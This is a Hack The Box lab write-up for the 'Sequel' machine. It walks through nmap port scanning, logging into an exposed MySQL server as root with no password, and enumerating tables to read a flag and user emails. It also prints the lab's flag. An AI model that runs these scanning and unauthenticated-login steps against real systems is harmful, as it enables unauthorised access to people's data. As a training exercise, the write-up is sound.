# Hack The Box - Sequel

## Machine Information

| Item | Value |
|------|-------|
| Machine | Sequel |
| Difficulty | Very Easy |
| Operating System | Linux |
| Target IP | 10.129.173.172 |

---

# Objective

- Enumerate the target.
- Identify the exposed service.
- Connect to the database.
- Enumerate databases and tables.
- Retrieve the flag.

---

# Methodology

```
Reconnaissance
      │
      ▼
Port Scanning
      │
      ▼
Service Identification
      │
      ▼
Database Connection
      │
      ▼
Database Enumeration
      │
      ▼
Table Enumeration
      │
      ▼
Data Extraction
      │
      ▼
Retrieve Flag
```

---

# 1. Reconnaissance

## Full TCP Scan

Command

```bash
sudo nmap -Pn -p- --min-rate 5000 -v 10.129.173.172 | tee nmap.txt
```

Result

```text
PORT     STATE SERVICE
3306/tcp open  mysql
```

### Finding

One service was discovered:

- MySQL (TCP/3306)

---

## Service Detection

Command

```bash
nmap -Pn -sV -p 3306 10.129.173.172
```

Result

```text
3306/tcp open mysql?
```

### Analysis

Nmap detected a MySQL-compatible service but could not confidently determine the exact version.

---

# 2. Understanding MySQL

MySQL is a relational database management system (RDBMS).

Its structure is hierarchical:

```
Server
   │
Database
   │
Tables
   │
Rows
   │
Columns
```

Unlike Redis, which stores data as key-value pairs, MySQL stores structured relational data.

---

# 3. Connect to MySQL

Verify the client exists.

```bash
mysql --version
```

Result

```text
mysql Ver 8.4.10
```

Connect to the server.

```bash
mysql -h 10.129.173.172 -u root
```

Result

```text
Welcome to the MySQL monitor...
Server version:
5.5.5-10.3.27-MariaDB
```

### Analysis

The server allows the **root** user to connect **without a password**.

This is a dangerous misconfiguration.

---

# 4. Enumerate Databases

List all databases.

Command

```sql
SHOW DATABASES;
```

Output

```text
htb
information_schema
mysql
performance_schema
```

### Analysis

System databases:

- information_schema
- mysql
- performance_schema

Target database:

```
htb
```

---

# 5. Select Database

Command

```sql
USE htb;
```

Result

```text
Database changed
```

---

# 6. Enumerate Tables

Command

```sql
SHOW TABLES;
```

Output

```text
config
users
```

---

# 7. Examine Table Structure

## Config Table

```sql
DESCRIBE config;
```

Output

| Field | Type |
|-------|------|
| id | bigint |
| name | text |
| value | text |

---

## Users Table

```sql
DESCRIBE users;
```

Output

| Field | Type |
|-------|------|
| id | bigint |
| username | text |
| email | text |

---

# 8. Retrieve Data

Read the configuration table.

```sql
SELECT * FROM config;
```

Output

```text
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
| 1  | timeout               | 60s                              |
| 2  | security              | default                          |
| 3  | auto_logon            | false                            |
| 4  | max_size              | 2M                               |
| 5  | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
| 6  | enable_uploads        | false                            |
| 7  | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```

Flag

```text
7b4bec00d1a39e3dd4e021ec3d915da8
```

---

Read the users table.

```sql
SELECT * FROM users;
```

Output

```text
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
| 1  | admin    | admin@sequel.htb |
| 2  | lara     | lara@sequel.htb  |
| 3  | sam      | sam@sequel.htb   |
| 4  | mary     | mary@sequel.htb  |
+----+----------+------------------+
```

---

# SQL Commands Learned

## Connect

```bash
mysql -h TARGET -u USERNAME
```

---

## Show Databases

```sql
SHOW DATABASES;
```

---

## Select Database

```sql
USE database_name;
```

Example

```sql
USE htb;
```

---

## Show Tables

```sql
SHOW TABLES;
```

---

## Describe Table

```sql
DESCRIBE table_name;
```

Example

```sql
DESCRIBE users;
```

---

## Read Data

```sql
SELECT * FROM table_name;
```

Examples

```sql
SELECT * FROM config;

SELECT * FROM users;
```

---

# Concepts Learned

## Relational Database

MySQL stores data using relationships.

```
Database
    │
    ▼
Table
    │
    ▼
Rows
    │
    ▼
Columns
```

---

## Enumeration Workflow

```
Connect
    │
    ▼
SHOW DATABASES
    │
    ▼
USE database
    │
    ▼
SHOW TABLES
    │
    ▼
DESCRIBE table
    │
    ▼
SELECT data
```

---

## MySQL vs Redis

### Redis

```
Database
    │
Key
    │
Value
```

Example

```
flag
    │
    ▼
03e1d2...
```

---

### MySQL

```
Database
    │
Table
    │
Rows
    │
Columns
```

Example

```
users

id
username
email
```

---

# Security Issue

The server allowed:

```
root
```

to authenticate without a password.

This is a critical security misconfiguration because anyone with network access could enumerate databases and retrieve sensitive information.

---

# Tools Used

- Nmap
- MySQL Client

---

# Attack Workflow

```
Nmap
   │
   ▼
Port 3306
   │
   ▼
MySQL Service
   │
   ▼
Connect as root
   │
   ▼
SHOW DATABASES
   │
   ▼
USE htb
   │
   ▼
SHOW TABLES
   │
   ▼
DESCRIBE
   │
   ▼
SELECT
   │
   ▼
Retrieve Flag
```

---

# Lessons Learned

- Port 3306 is the default MySQL service port.
- MySQL uses a hierarchical structure: Server → Database → Table → Row.
- `SHOW DATABASES` lists available databases.
- `USE` selects a database.
- `SHOW TABLES` lists tables within the selected database.
- `DESCRIBE` displays the table schema.
- `SELECT` retrieves stored data.
- Exposing a database server with unrestricted root access is a serious security risk.

---

# Skills Gained

- MySQL Enumeration
- SQL Fundamentals
- Database Navigation
- Table Inspection
- Data Extraction
- Relational Database Concepts
- MySQL Client Usage

---

# Machine Summary

| Category | Result |
|----------|--------|
| Target | 10.129.173.172 |
| Service | MySQL |
| Port | 3306 |
| Authentication | Root (No Password) |
| Databases Found | 4 |
| Tables Enumerated | 2 |
| Flag Retrieved | ✅ |
| Machine Status | Completed |